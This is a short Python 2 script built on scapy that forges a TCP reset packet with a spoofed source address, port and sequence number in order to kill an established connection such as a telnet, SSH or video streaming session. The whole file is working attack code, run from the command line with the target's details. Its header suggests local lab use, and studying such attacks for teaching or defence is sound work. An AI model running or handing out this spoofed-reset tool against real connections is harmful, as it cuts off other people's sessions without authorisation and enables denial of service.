##Python script to perform TCP RST attacks on established connection locally (say, telnet, SSH and/or video streaming application)

import sys
from scapy.all import *

interface = "eth0"
source = None
srcprt = None
target = None
port = None
seq = None

class SendRST():
	global target, port
	def transfer(self):
		i = IP()
		i.src = source
		i.dst = target
		
		t = TCP()
		t.sport = srcprt
		t.dport = port
		t.flags = 'R'
		t.seq = seq
		send(i/t, verbose=0)

if __name__ == "__main__":
	#Check for all required arguments
	if len(sys.argv) != 6:
		print "Usage: %s <Source IP> <Source port> <Target IP> <Target Port> <Seq. No>" % sys.argv[0]
		exit()

	source = sys.argv[1]	
	srcprt = int(sys.argv[2])
	target = sys.argv[3]
	port = int(sys.argv[4])
	seq = int(sys.argv[5])
	conf.iface = interface

	print "Sending %s:%i RST Packet as %s:%i" % (target, port, source, srcprt)
	SendRST().transfer()

